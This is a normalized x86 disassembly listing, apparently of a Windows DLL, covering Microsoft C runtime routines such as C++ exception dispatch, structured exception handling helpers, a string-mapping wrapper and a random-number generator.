mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_1001db70
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1001d089
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10013ee4
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1001d0ce
push 0x8
push r--data
call sub_1000ed24
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1000ed69
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1001c9de
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001d123
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001d14c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_10018241
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1001cf00
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1001d210
push 0x2c
push r--data
call sub_1000ed24
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1001cc8d
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10013ee4
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10013ee4
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10013ee4
mov [ eax + 0x88 ] esi
call sub_10013ee4
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1001cd32
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d336
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
sub_1001d2a9
mov esp [ ebp - 0x18 ]
call sub_10013ee4
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001cfa8
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d336
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1001d336
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1001cce0
pop ecx
call sub_10013ee4
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10013ee4
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1001ccb9
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1001d0ce
pop ecx
pop ecx
sub_1001d3ac
push 0xc
push r--data
call sub_1000ed24
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10018241
push ebx
push esi
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001dc13
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1000cb70
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1001dc13
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001d123
pop ecx
pop ecx
push eax
push esi
call sub_1000cb70
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1000ed69
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001d123
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001d52b
push 0x8
push r--data
call sub_1000ed24
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001d123
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001c9de
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001d3ac
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000ed69
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001d123
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001c9de
jmp r-xdata
sub_1001d5bd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001d52b
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1001c9ac
call sub_1001c9e5
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001cfa8
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1001d210
add esp 0x28
test eax eax
je r-xdata
sub_1001d62b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10013ee4
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10013ee4
lea edi [ eax + 0x80 ]
call sub_10013c52
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1001cc18
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_10018241
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001caa2
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001d5bd
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_1001d71f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_10018241
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10013ee4
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10018241
call sub_100181f5
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001d62b
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10013ee4
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10013ee4
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10013ee4
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1001dc13
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1001cc18
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_10018241
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1001d0ce
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_10013ee4
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_10013ee4
mov edi [ eax + 0x94 ]
call sub_10013ee4
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1001d14c
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1001d14c
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_1000d0ad
test al al
jne r-xdata
call sub_10018241
cmp eax 0x19930522
jne r-xdata
call sub_10013ee4
call sub_10013ee4
call sub_10013ee4
mov [ eax + 0x88 ] esi
call sub_10013ee4
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_1001cf00
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1001d0ce
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1001ceb0
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10011014
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1001d5bd
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001c9e5
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001cfa8
add esp 0x10
push [ esi + 0x1c ]
call sub_1001d1c7
sub_1001da83
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10013ee4
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1001d71f
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001cfa8
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001db70
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10017854
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10017854
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001dbbc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_10002380
mov [ ecx ] r--data
jmp sub_1000d45c
sub_10002390
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000d45c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000c4b4
add esp 0x4
sub_100023c0
retn
sub_100024c0
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_10002520
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_10002450
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10002540
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_10002450
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100025a0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_100025c0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10002ff0
int3
sub_10008ec0
mov ecx [ eax ]
push ecx
call sub_1000c4b4
pop ecx
retn
sub_10009500
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_100025c0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10009b20
mov ecx [ ebp - 0x14 ]
push ecx
call sub_1000c4b4
add esp 0x4
push 0x0
push 0x0
call sub_10011014
int3
sub_1000a1d0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
sub_1000a2e0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_1000d3ff
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a300
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call sub_1000ced5
pop ecx
sub_1000c1d6
push [ ebp + 0x8 ]
call sub_1000f056
pop ecx
retn
sub_1000c1e0
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c11c
add esp 0xc
pop ebp
retn
sub_1000c48d
push [ ebp + 0x18 ]
call sub_1000f056
pop ecx
retn
sub_1000c497
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000c401
add esp 0x14
pop ebp
retn
sub_1000c4b4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000ced5
sub_1000c6cb
push [ ebp + 0x14 ]
call sub_1000f056
pop ecx
retn
sub_1000c8d6
push [ ebp + 0x8 ]
call sub_1000f056
pop ecx
retn
sub_1000c9e5
push [ ebp + 0x8 ]
call sub_1000f056
pop ecx
retn
sub_1000cada
push esi
call sub_1000f056
pop ecx
retn
sub_1000cae2
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_1000d3e2
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1000cf2b
push 0x4
call sub_1001200d
pop ecx
retn
sub_1000cfa9
push 0x4
call sub_1001200d
pop ecx
retn
sub_1000d07c
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_100130d5
pop ecx
retn
sub_1000d37e
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_1000d3e2
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_1000d45c
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_1000ced5
pop ecx
sub_1000d472
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_1000d5dd
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10015781
add esp 0xc
pop ebp
retn
sub_1000d5f3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000d5dd
sub_1000d63b
push 0xc
push r--data
call sub_1000ed24
call sub_10013ee4
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_1000d5fe
sub_1000d670
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_10012e7e
int3
sub_1000d7af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000d90c
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d8e6
add esp 0x14
retn
sub_1000db26
mov edi edi
push ebp
mov ebp esp
call sub_10013ee4
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_1000db38
call sub_10013ee4
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_1000de19
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000dbd7
add esp 0x10
pop ebp
retn
sub_1000dede
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000de33
pop ecx
pop ecx
pop ebp
retn
sub_1000e086
push 0x4
call sub_1001200d
pop ecx
retn
sub_1000e15d
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1000e37b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10015a5d
pop ecx
pop ecx
retn
sub_1000e6dc
push 0xa
call sub_1001200d
pop ecx
retn
sub_1000e7df
push 0xa
call sub_1001200d
pop ecx
retn
sub_1000e89d
push 0xb
call sub_1001200d
pop ecx
retn
sub_1000e9ed
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_1000ec34
xor eax eax
inc eax
retn
sub_1000ed69
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1000efc3
call sub_10010989
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1000ced5
pop ecx
retn
call sub_10016ad3
sub_1000f4b9
push 0x1
call sub_1001200d
pop ecx
retn
sub_1000f59a
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_1000f4c4
add esp 0xc
pop ebp
retn 0x4
sub_1000f5cd
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1001785d
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1000f600
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_1000f4c4
add esp 0xc
pop ebp
retn 0x8
sub_1000fdf7
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_100107f5
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_10010951
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_1000f092
pop ecx
pop ecx
retn
sub_10010980
push 0x1
call sub_1001200d
pop ecx
retn
sub_10010989
push 0x1
call sub_100108af
pop ecx
retn
sub_10010e64
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_10010fc0
call sub_10012c83
retn
sub_10010fc6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10010f8a
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10010fdd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10011e08
push 0xc
push r--data
